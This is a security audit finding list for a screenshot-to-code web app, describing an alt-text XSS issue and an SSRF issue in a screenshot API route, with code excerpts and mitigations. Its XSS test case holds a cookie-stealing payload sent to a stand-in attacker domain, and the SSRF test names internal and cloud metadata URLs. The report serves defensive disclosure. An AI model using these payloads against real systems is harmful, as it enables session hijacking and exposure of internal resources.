# Final Valid High/Critical Severity Vulnerabilities List:

## 1. Cross-Site Scripting (XSS) via Image Alt-Text Injection

### Description:
1. An attacker provides a malicious screenshot containing an alt-text metadata field embedded with malicious JavaScript code.
2. The backend application processes uploaded images using AI and directly includes user-supplied alt-text into generated HTML or React frontend components without sufficient escaping or input validation.
3. The frontend receives and renders this generated code directly, resulting in the execution of the malicious JavaScript payload when viewed by other users.

### Impact:
- Execution of arbitrary JavaScript code within the context of the victim's browser.
- Enables attacks such as session hijacking, stealing sensitive user information, or defacing the application UI.

### Vulnerability Rank:
- High

### Currently Implemented Mitigations:
- Predominant use of placeholder images and AI-generated descriptions, offering limited incidental protection.

### Missing Mitigations:
- Explicit sanitization routines for user-supplied alt-text before embedding it in the frontend.
- Lacking character escaping or HTML encoding for user-provided content.
- Absence of a strict Content Security Policy (CSP).

### Preconditions:
- Attacker requires the ability to upload a screenshot containing malicious alt-text metadata.
- AI-based backend must directly embed attacker-provided alt-text into frontend HTML without validation or encoding.

### Source Code Analysis:
1. Backend file: `backend/image_generation/core.py` processes image attributes without sanitization:
    ```python
    for img in images:
        if not img["src"].startswith("https://placehold.co"):
            mapping[img["alt"]] = img["src"]
    ```
   This code directly accepts user-provided input without validating or escaping potentially malicious alt-text.

2. Alt-text subsequently propagates into dynamically generated code by backend services (`backend/llm.py`) without proper sanitization.

3. Generated HTML transmitted directly to frontend interfaces via API endpoints (`/generate-code`) lacking input validation.

### Security Test Case:
1. Create and upload a screenshot with malicious alt-text payload:
    ```html
    "><img src=x onerror=document.location='http://attacker-domain.com/?'+document.cookie>
    ```
2. Initiate frontend code generation involving malicious alt-text.
3. Backend processes malicious alt-text without sanitization, thereby embedding it unsafely into generated frontend code.
4. Upon frontend rendering, malicious JavaScript executes, sending victim's browser cookies to attacker-controlled domain.

## 2. Insufficient Validation of Video/Screenshot Processing Inputs Leading to Potential Injection and SSRF

### Description:
1. Backend accepts URLs and directly uses them to invoke the `screenshotone.com` API with no rigorous URL validation or restrictions.
2. Attacker submits malicious URLs, including internal network resources or localhost addresses.
3. External screenshot service (`screenshotone.com`) attempts to process these internal URLs, potentially granting attackers unauthorized insights into internal network resources.

### Impact:
- Unauthorized access or exposure of internal or protected resources.
- Potential leak of sensitive or confidential internal data to external parties.
- Exploitation of internal network resources through SSRF (Server-Side Request Forgery).

### Vulnerability Rank:
- High

### Currently Implemented Mitigations:
- None observed. The screenshot API client (`backend/routes/screenshot.py`) performs no URL validation or filtering.

### Missing Mitigations:
- No validation, filtering, or sanitization of user-supplied URLs.
- Missing checks against internal or reserved IP addresses to prevent SSRF attacks.
- Absence of URL validation mechanisms restricting access to sensitive internal resources.

### Preconditions:
- Attacker gains access to the public API endpoint facilitating screenshot URL submissions.

### Source Code Analysis:
The vulnerability occurs in the `backend/routes/screenshot.py` file:
```python
async def capture_screenshot(target_url: str, api_key: str, device: str = "desktop") -> bytes:
    api_base_url = "https://api.screenshotone.com/take"

    params = {
        "access_key": api_key,
        "url": target_url,  # no validation or filtering; attacker-controlled
        ...
    }
    async with httpx.AsyncClient(timeout=60) as client:
        response = await client.get(api_base_url, params=params)
```

**Analysis Explanation:**
- User-submitted input (`target_url`) is directly utilized without validation as the URL parameter within HTTP GET requests sent to the external screenshot-taking service `screenshotone.com`.
- Missing validation enables attacker submission of internal network URLs, which `screenshotone.com` may attempt to access, effectively bypassing internal restrictions and exposing sensitive data or internal resources.

### Security Test Case:
1. Access the publicly exposed screenshot API endpoint.
2. Submit URLs targeting internal endpoints or sensitive internal resources such as:
    - Localhost services: `http://localhost:<port>`
    - Cloud or container metadata endpoints: `http://169.254.169.254/latest/meta-data`
    - Internal private IP addresses: `http://10.x.x.x` or local IP ranges (`http://192.168.x.x`)
3. Observe if the response includes screenshots or sensitive information retrieved from the internal environment via the external provided screenshot service.
4. Verify whether internal resources and configuration data are unintentionally exposed.

## Recommendations for Mitigation:

### For Cross-Site Scripting (XSS) via Image Alt-Text Injection:
- **Explicit Input Sanitization:**
  Implement robust backend sanitization libraries like **Bleach** to encode or escape all user-provided text before rendering.
- **Strict CSP Implementation:**
  Introduce and enforce a strict Content Security Policy to restrict the execution of potentially malicious scripts.

### For Insufficient Validation of Video/Screenshot Processing Inputs (Potential SSRF):
- **URL Restriction and Validation:**
  Introduce strict URL validation logic to reject URLs leading to internal network addresses, localhost, metadata endpoints, or reserved IP ranges.
- **IP Address Filtering:**
  Implement a deny list or allow list approach for external requests made by backend components towards external screenshot APIs, blocking dangerous or internal exploration attempts.
- **Network Level Restrictions:**
  Consider deploying firewall rules or isolated network segments to prevent backend applications or external services from accessing internal resources under normal operations.
